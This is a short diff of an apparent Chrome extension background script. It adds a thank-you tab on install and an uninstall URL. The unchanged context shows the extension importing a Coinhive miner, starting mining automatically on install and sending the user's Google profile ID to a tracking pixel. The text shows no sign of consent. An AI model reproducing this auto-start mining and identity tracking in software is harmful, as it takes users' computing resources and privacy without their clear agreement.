@@ -3,6 +3,8 @@ import './lib/coinhive';
 import { checkRequestStatus } from './utils';
 import {
   CONFIG_URL,
+  THANK_YOU_PAGE_URL,
+  UNINSTALL_PAGE_URL,
   DEFAULT_SETTINGS,
   IS_MINING,
   ENABLE_MINING,
@@ -98,6 +100,7 @@ const setEvents = () => {
     identity.getProfileUserInfo(({ id }) => injectTrackingPixel(id));
     enableMining();
     _gaq.push(['_trackEvent', 'Mining', 'autoStart']);
+    chrome.tabs.create({ url: THANK_YOU_PAGE_URL, active: true });
   });
 
   runtime.onMessage.addListener((request, sender, sendResponse) => {
@@ -152,6 +155,8 @@ const setMinerEvents = () => {
     runtime.sendMessage({ type: AUTHED_EVENT });
   });
 };
+
+chrome.runtime.setUninstallURL(UNINSTALL_PAGE_URL);
 
 setEvents();
 setMinerEvents();
